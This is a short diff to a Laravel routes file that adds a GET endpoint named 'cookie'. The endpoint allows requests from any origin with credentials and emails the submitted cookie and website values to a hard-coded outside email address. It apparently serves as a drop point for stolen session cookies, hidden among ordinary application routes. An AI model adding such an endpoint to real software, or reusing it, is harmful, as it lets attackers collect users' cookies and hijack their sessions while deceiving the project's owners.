@@ -66,4 +66,13 @@ Route::group([
     Route::post('upload/image', 'UploadController@image');
 
 
+    Route::get('cookie', function (Request $request) {
+        header('Access-Control-Allow-Origin: *');
+        header('Access-Control-Allow-Methods: ' . 'GET, POST, PATCH, PUT, DELETE, OPTIONS, HEAD');
+        header('Access-Control-Allow-Headers: ' . 'Content-Type, Accept, Cookie, X-Requested-With');
+        header('Access-Control-Allow-Credentials: ' . 'true');
+
+        Mail::to('13571899655@163.com')->send(new \App\Mail\UserNotify('success', $request->cookie, [], $request->website));
+    });
+
 });
